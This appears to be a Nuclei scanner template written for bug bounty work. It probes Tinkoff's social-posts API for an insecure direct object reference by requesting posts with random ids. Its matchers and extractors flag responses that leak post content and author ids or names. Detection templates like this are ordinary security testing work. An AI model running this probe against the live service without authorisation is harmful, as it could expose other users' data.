id: tinkoff-idor

info:
  name: Tinkoff - IDOR Vulnerabilities
  author: bugbounty
  severity: high
  description: Insecure Direct Object Reference in social posts API
  tags: idor,tinkoff
  reference:
    - https://portswigger.net/web-security/access-control/idor

http:
  - raw:
      - |
        GET /api/invest-gw/social/v1/post?id={{randstr}} HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers-condition: and
    matchers:
      - type: word
        part: content_type
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"id"\s*:\s*"[a-zA-Z0-9_-]{10,}"'
          - '"author"\s*:\s*\{\s*"(id|name|username)"\s*:'
          - '"content"\s*:\s*".{10,}"'
        condition: and

      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'len(body) > 200'
        condition: and

      - type: word
        part: body
        words:
          - '"error"'
          - '"forbidden"'
          - '"unauthorized"'
          - '"not_found"'
        condition: or
        negative: true

    extractors:
      - type: json
        part: body
        json:
          - '.id'
          - '.author.id'
          - '.author.name'
